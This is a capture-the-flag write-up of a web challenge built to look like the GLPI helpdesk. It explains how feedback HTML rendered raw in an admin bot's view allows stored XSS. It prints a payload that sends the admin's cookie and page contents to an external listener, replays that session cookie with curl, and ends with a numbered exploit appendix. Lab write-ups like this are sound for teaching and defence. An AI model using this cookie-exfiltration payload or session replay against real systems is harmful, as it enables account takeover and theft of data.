<!--
  Writeup in English. Publish only after the event.
  Host anonymized as <HOST>:<PORT>. Challenge-derived values (flag) stay.
-->
<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=CENTRAL+DE+CHAMADOS" alt="Typing SVG" /></a>

</div>

# Central de Chamados — WEB · 🔴 HARD

- **Status:** ✅ SOLVED — stored XSS in the feedback body, rendered raw in the admin's view, steals the admin's (non-HttpOnly) session cookie.
- **Points:** 377 (final dynamic value)
- **Flag:** `IDP{at3nd1m3nt0_ign0r4d0_c0m_SuC3SS0_dqaDr93Xev}`
- **Target:** `http://<HOST>:<PORT>` (per-instance container, 15 min TTL, port changes on each relaunch)
- **Prompt:** *"Esse ano, o TI agora só abre chamados via sistema. O que acha?"*

---

## TL;DR

1. The target **looks like GLPI** (Teclib' branding, `GLPI Copyright 2015-2025` footer, `/front/*.php` routes) but is a **custom Python/Flask app** (`Server: gunicorn`). All GLPI CVEs are a decoy.
2. **Self-registration is open** → any user can open tickets and submit "feedback". The feedback body (`conteudo`) accepts HTML.
3. The **requester view HTML-escapes** `conteudo`, but the **admin view renders it raw** (`<div class="conteudo-rico">…`). An **admin bot (HeadlessChrome)** opens every feedback ticket → **stored XSS fires in the admin's browser**.
4. The session cookie is **not HttpOnly**, so the XSS exfiltrates the admin's `glpi_*` cookie to an external listener. Replaying that cookie, the admin's internal ticket **"Senha do cofre de senhas" (#23846)** holds the flag.

## Analysis

### It is not real GLPI
`GET /status.php` / `/CHANGELOG.md` return a custom error page, not GLPI's `GLPI_OK`. Backend header is `Server: gunicorn` (Python/Flask), classes/paths are hand-rolled Portuguese. The GLPI skin is cosmetic — attack the custom logic.

### Routes (as a *Solicitante*)
| Path | Function |
|---|---|
| `POST /` | login (`login_name`,`login_password`,`auth=local`) |
| `/front/cadastro.php` | **self-register** (auto-login, 302 → `/Helpdesk`) |
| `/Form/Render/1` | open ticket (no captcha) — `tipo`,`categoria`,`titulo`,`descricao` |
| `/Form/Render/95` | **feedback** — `especifico`,`numero`,`conteudo`,`captcha` |
| `/front/ticket.php` | my tickets list |
| `/front/ticket.form.php?id=N` | ticket detail (403 for others' tickets, 404 if non-existent) |

### Mapping the filters (canary)
- Ticket `descricao`: stored, **HTML-escaped on display** → no SSTI (`{{7*7}}` literal), no XSS (`<>`→`&lt;`).
- Ticket `titulo`: server-side validation **rejects `<` / `{`**.
- Feedback `numero`: server-side **numeric validation** ("Informe o número do chamado") → no injection into the auto-built title `Feedback do GLPI - chamado #N`.
- Feedback `conteudo`: requires non-empty **text**; the client editor has a "código" (source) mode that submits **raw HTML**. On a failed submit the server reflects it **raw** into the `contenteditable` editor — a reflected (self) XSS, and the hint that `conteudo` is an HTML sink.
- Direct read of others' tickets is blocked (403), but 403-vs-404 is an existence oracle.

### The real bug: admin-side raw render + stored XSS
Submitting a **feedback** creates a ticket of category "Feedback do GLPI" that an **admin bot ("Equipe Tecnologia")** auto-reviews and marks *Solucionado*. A beacon payload stored in `conteudo` confirmed the bot:

```html
OK <img src="https://<LISTENER>/adm" onerror="fetch('https://<LISTENER>/xadm',{method:'POST',body:document.cookie+String.fromCharCode(10)+location.href+String.fromCharCode(10)+document.documentElement.outerHTML})">
```

The listener received a request from **`<HOST>` / Microsoft Azure / `User-Agent: HeadlessChrome`**, i.e. the bot's browser, with `referer http://127.0.0.1:8000/`. The exfiltrated admin HTML showed the ticket rendered **raw**:

```html
<div class="conteudo-rico">OK <img src="…/adm" onerror="…"></div>
```

So the **requester view escapes but the admin view does not** — classic stored XSS that only fires for the privileged viewer. The exfiltrated POST body contained the admin's cookie:

```
glpi_8ac3914e6055f1dc4d1023c9bbf5ce82=<ADMIN_SESSION>
```

The cookie is readable from `document.cookie` → **not HttpOnly**.

### Impersonate the admin → flag
Replaying the stolen cookie as the admin (`Administrador`, login `glpi`, "Equipe Tecnologia"):

```bash
ADM='glpi_8ac3914e6055f1dc4d1023c9bbf5ce82=<ADMIN_SESSION>'
curl -s -b "$ADM" "$T/front/ticket.php"            # lists admin-only tickets
curl -s -b "$ADM" "$T/front/ticket.form.php?id=23846"
```

The admin sees internal tickets hidden from us, including **#23846 "Senha do cofre de senhas"**:

```html
<div class="conteudo-rico"><p>Chave de acesso ao cofre de senhas da TI, usar somente em caso de indisponibilidade do SSO:</p>
<p><code>IDP{at3nd1m3nt0_ign0r4d0_c0m_SuC3SS0_dqaDr93Xev}</code></p>
<p>Não compartilhar em nenhuma hipótese (isso não deveria nem estar aqui).</p></div>
```

**Flag:** `IDP{at3nd1m3nt0_ign0r4d0_c0m_SuC3SS0_dqaDr93Xev}`

## What didn't work

| Hypothesis | Result | Why |
|---|---|---|
| GLPI known CVE (htmLawed RCE, inventory SQLi) | ✗ | not real GLPI; custom Flask app |
| SSTI in `descricao` / feedback `conteudo` | ✗ | `{{7*7}}` stays literal |
| Stored XSS in `descricao` (requester view) | ✗ | HTML-escaped on output |
| HTML/XSS via feedback `numero` → title | ✗ | numeric-only server validation |
| Direct IDOR read of admin tickets | ✗ | ownership check (403) |

## Conclusion

Output encoding was applied **only on the requester-facing template**; the admin/bot template rendered the same `conteudo` raw. Combined with a non-HttpOnly session cookie and an automated HeadlessChrome reviewer, a stored `<img onerror>` in a feedback is enough to hijack the admin session and read the internal vault ticket.

---

## Appendix — exploit steps
1. `POST /front/cadastro.php` → self-register, auto-login.
2. Stand up an external listener (collaborator / webhook).
3. Submit feedback (`/Form/Render/95`, solve captcha) with `conteudo` = text + `<img src=//LISTENER onerror="fetch('//LISTENER',{method:'POST',body:document.cookie+'\n'+document.documentElement.outerHTML})">`.
4. Admin HeadlessChrome bot reviews it → receive the admin cookie at the listener.
5. Replay the cookie: `curl -b 'glpi_…=<ADMIN_SESSION>' $T/front/ticket.form.php?id=23846` → flag.
